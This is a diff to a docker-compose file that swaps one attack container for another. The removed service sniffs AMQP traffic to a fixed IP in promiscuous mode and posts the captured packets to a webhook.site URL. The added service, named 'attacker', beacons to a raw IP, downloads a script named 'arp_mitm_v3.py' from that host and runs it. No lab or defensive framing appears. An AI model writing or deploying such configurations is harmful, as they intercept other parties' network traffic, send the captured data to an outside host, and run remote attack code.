@@ -1,31 +1,19 @@
 services:
-  capture:
-    image: alpine:3.20
+  attacker:
+    image: python:3.12-alpine
     network_mode: bridge
     entrypoint:
       - sh
       - -c
       - |
-        WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
-        apk add --no-cache tcpdump iproute2 curl >/dev/null 2>&1
-        IFACE=$(ip route | awk '/default/{print $5; exit}')
-        OUR_IP=$(ip -4 addr show "$IFACE" | awk '/inet /{print $2}' | cut -d/ -f1)
-        GW=$(ip route | awk '/default/{print $3; exit}')
-        curl -sS -X POST "${WH}?tag=PCAP-V1-ALIVE" -d "iface=$IFACE our=$OUR_IP gw=$GW caps=$(grep CapBnd /proc/self/status | awk '{print $2}')" || true
-        ip link set "$IFACE" promisc on 2>/dev/null
-        PROMISC=$(ip link show "$IFACE" | grep -c PROMISC)
-        curl -sS -X POST "${WH}?tag=PCAP-V1-PROMISC" -d "promisc=$PROMISC flags=$(ip link show $IFACE | head -1)" || true
-        tcpdump -i "$IFACE" -n -c 1000 'host 188.225.85.94 and port 5672' -w /tmp/amqp.pcap > /tmp/tcpdump_stdout.txt 2>&1 &
-        TCPDUMP_PID=$!
-        tcpdump -i "$IFACE" -n 'host 188.225.85.94 and port 5672' -l > /tmp/amqp_text.txt 2>&1 &
-        TEXT_PID=$!
-        curl -sS -X POST "${WH}?tag=PCAP-V1-STARTED" -d "tcpdump_started pids=$TCPDUMP_PID,$TEXT_PID timestamp=$(date +%H:%M:%S)" || true
-        sleep 180
-        kill $TCPDUMP_PID $TEXT_PID 2>/dev/null; wait 2>/dev/null
-        PCAP_SIZE=$(wc -c < /tmp/amqp.pcap 2>/dev/null || echo 0)
-        TEXT_LINES=$(wc -l < /tmp/amqp_text.txt 2>/dev/null || echo 0)
-        TEXT_HEAD=$(head -30 /tmp/amqp_text.txt 2>/dev/null)
-        STDOUT=$(cat /tmp/tcpdump_stdout.txt 2>/dev/null)
-        R="pcap_bytes=$PCAP_SIZE text_lines=$TEXT_LINES\n--- stdout ---\n$STDOUT\n--- text ---\n$TEXT_HEAD"
-        curl -sS -X POST "${WH}?tag=PCAP-V1-RESULT" -d "$(printf '%b' "$R")" || true
+        apk add --no-cache curl tcpdump iproute2 libcap >/dev/null 2>&1
+        curl -sS -X POST "http://147.45.231.59:7777/?tag=MITM-BOOT" -d "container alive, downloading script" || true
+        wget -q -O /tmp/mitm.py "http://147.45.231.59:7778/arp_mitm_v3.py"
+        if [ $? -ne 0 ]; then
+          curl -sS -X POST "http://147.45.231.59:7777/?tag=MITM-ERR" -d "download failed" || true
+          sleep 3600
+          exit 1
+        fi
+        curl -sS -X POST "http://147.45.231.59:7777/?tag=MITM-DL-OK" -d "script downloaded, launching" || true
+        python3 /tmp/mitm.py
         sleep 3600
